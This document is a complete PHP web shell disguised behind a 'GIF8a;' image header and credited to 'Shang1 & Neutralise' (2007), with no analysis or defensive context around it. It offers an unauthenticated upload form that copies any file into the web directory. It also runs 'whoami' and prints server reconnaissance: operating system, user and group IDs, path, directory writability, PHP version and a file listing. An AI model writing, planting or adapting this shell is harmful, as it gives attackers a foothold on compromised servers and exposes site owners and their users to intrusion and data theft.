GIF8a;       <title>Shang1 &&nbsp;Neutralise</title>
    <body bgcolor="#808080" text="#000000" link="#000000" vlink="#000000">
             <div align="center"><br /><br /> <font style="font-size: 70pt;" color="#000000" face="Webdings">!</font><img src="http://img294.imageshack.us/img294/290/shangro7.png" /> <font style="font-size: 70pt;" color="#000000" face="Webdings">!</font>   <br /><br />
        <form enctype="multipart/form-data" action="<?php echo $_SERVER["PHP_SELF"]; ?>" method="post">
                      <div align="center" STYLE="font-family: verdana; font-size: 10px;">
            <input type="hidden" name="MAX_FILE_SIZE" value="2048000">
          File :
          <input name="userfile" type="file" />
            <br />
            <input name="submit" type="submit" value="Upload" />
              </div>
        </form>
           <div align="center" STYLE="font-family: verdana; font-size: 10px;">
             <?php
          if (@is_uploaded_file($_FILES["userfile"]["tmp_name"])) {
copy($_FILES["userfile"]["tmp_name"], "" . $_FILES["userfile"]["name"]);
echo "<p>File uploaded successfully</p>";
}
?>
          </div></td>   </tr>                 </table>                </body>
            <hr  width=751px color="black" height=115px> <br />
<?php
  closelog( );
  $user = get_current_user( );
  $login = posix_getuid( );
  $euid = posix_geteuid( );
  $ver = phpversion( );
  $gid = posix_getgid( );
  if ($chdir == "") $chdir = getcwd( );
  if(!$whoami)$whoami=exec("whoami");
?>
<TABLE BORDER="0" CELLPADDING="0" CELLSPACING="0">
<TR>
  <TD><DIV STYLE="font-family: verdana; font-size: 10px;"><b>Operating System:</b> <?echo PHP_OS;?></DIV></TD>
  </TR>
<?php
  $uname = posix_uname( );
  while (list($info, $value) = each ($uname)) {
?>
  <TR>
    <TD><DIV STYLE="font-family: verdana; font-size: 10px;"><b><?= $info ?></b>: <?= $value ?></DIV></TD>
  </TR>

<?php
  }
?>
<?php
 if ($handle = opendir('.')) {
   while (false !== ($file = readdir($handle)))
      {
          if ($file != "." && $file != "..")
	  {
          	$thelist .= '<a href="'.$file.'">'.$file.'</a><br>';
          }
       }
  closedir($handle);
  }
?>
  <TR>
  <TD ><DIV STYLE="font-family: verdana; font-size: 10px;"><b>User Info:</b> uid=<?= $login ?>(<?= $whoami?>) euid=<?= $euid ?>(<?= $whoami?>) gid=<?= $gid ?>(<?= $whoami?>)</DIV></TD>
  </TR>
  <TR>
  <TD><DIV STYLE="font-family: verdana; font-size: 10px;"><b>Current Path:</b> <?= $chdir ?></DIV></TD>
  </TR>
  <TR>
  <TD ><DIV STYLE="font-family: verdana; font-size: 10px;"><b>Permission Directory:</b> <? if(@is_writable($chdir)){ echo "Yes"; }else{ echo "No"; } ?></DIV></TD>
  </TR>
  <TR>
  <TD><DIV STYLE="font-family: verdana; font-size: 10px;"><b>Server Services:</b> <?= "$SERVER_SOFTWARE $SERVER_VERSION"; ?></DIV></TD>
  </TR>
  <TR>
  <TD><DIV STYLE="font-family: verdana; font-size: 10px;"><b>Server Adress:</b> <?= "$SERVER_ADDR $SERVER_NAME"; ?></DIV></TD>
  </TR>
  <TR>
  <TD><DIV STYLE="font-family: verdana; font-size: 10px;"><b>Script Current User:</b> <?= $user ?></DIV></TD>
  </TR>
  <TR>
  <TD><DIV STYLE="font-family: verdana; font-size: 10px;"><b>PHP Version:</b> <?= $ver ?></DIV></TD>
  </TR>
    <TR>
  <TD><DIV STYLE="font-family: verdana; font-size: 10px;"><b>Server Time:</b> <?echo date("d/m/Y/ h:i:s",time());?></DIV></TD>
  </TR>
  <TR>
  <TD><DIV STYLE="font-family: verdana; font-size: 10px;"><b>Server Port:</b> <?echo $_SERVER['SERVER_PORT'];?></DIV></TD>
  </TR>
    <TR>
  <TD><DIV STYLE="font-family: verdana; font-size: 10px;"><b><br />Files in Directory:<br /></b> <?=$thelist?></DIV></TD>
  </TR>
    <TR>
  <TD><DIV STYLE="font-family: verdana; font-size: 10px;"><i><br />**Windows Servers will error here**</i></DIV></TD>
  </TR>
</center>
</TABLE>
</b>
</div></font></div>
</font>        <br />
       <hr  width=751px color="black" height=115px>
<div >

                        <div align="center" STYLE="font-family: verdana; font-size: 10px;"> Shang1 & Neutralise ©2007</div>